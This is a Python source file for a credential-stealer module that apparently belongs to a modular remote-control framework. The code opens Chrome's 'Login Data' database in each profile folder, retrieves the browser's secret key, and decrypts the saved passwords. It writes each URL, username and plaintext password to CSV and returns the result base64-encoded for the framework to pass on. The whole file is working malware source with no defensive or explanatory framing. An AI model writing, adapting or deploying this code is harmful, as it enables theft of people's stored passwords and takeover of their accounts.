import base64
import csv
from io import StringIO
from modules.basemodule import BaseModule

from modules.stealer.lib import *

class StealerModule(BaseModule):

    @staticmethod
    def get_module_id() -> str:
        return "stealer"

    @staticmethod
    def get_topic() -> str:
        return "stealer"

    def do(self, topic, payload):
        f = StringIO()
        writer = csv.writer(f, delimiter=";")
        writer.writerow(["Index", "URL", "Username", "Password"])
        if not self._steal(writer):
            return False
        return base64.b64encode(f.getvalue().encode()).decode()

    def _steal(self, writer):
        secret_key = get_secret_key()
        if not secret_key:
            return {"error": "Secret key cannot be accessed"}
        for folder in get_data_folders():
            chrome_path_login_db = os.path.normpath(r"%s\%s\Login Data"%(CHROME_PATH, folder))
            conn = get_db_connection(chrome_path_login_db)
            if not conn:
                return {"error": "Chrome database not found"}
            cursor = conn.cursor()
            cursor.execute("SELECT action_url, username_value, password_value FROM logins")
            for index, login in enumerate(cursor.fetchall()):
                url = login[0]
                username = login[1]
                ciphertext = login[2]
                decrypted_password = "** fail **"

                if (url == ""):
                    continue
                if (ciphertext):
                    decrypted_password = decrypt_password(ciphertext, secret_key)
                writer.writerow([str(index), url, username, decrypted_password])
        return True


    